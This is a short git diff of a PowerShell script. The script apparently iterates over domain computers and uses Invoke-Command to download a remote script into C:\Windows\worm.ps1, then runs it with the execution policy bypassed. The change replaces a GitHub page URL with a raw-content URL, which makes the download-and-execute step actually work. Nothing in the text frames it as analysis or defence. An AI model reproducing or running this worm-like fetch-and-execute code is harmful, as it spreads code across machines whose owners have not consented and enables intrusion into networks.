@@ -13,7 +13,7 @@ Foreach($i in $computerNames){
             if((get-content -path 'C:\Users\Public\Downloads\desktop.log') -lt ([int][double]::Parse((get-date -UFormat %s))) - 5){
                 Invoke-Command -ScriptBlock {
                 $WebClient = New-Object System.Net.WebClient
-                $WebClient.DownloadFile("https://github.com/Magrene/PowershellShell/blob/master/EnumerateDomain.ps1","C:\Windows\worm.ps1")
+                $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/master/EnumerateDomain.ps1","C:\Windows\worm.ps1")
                 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\worm.ps1' -ExecutionPolicy Bypass
                 }
             }
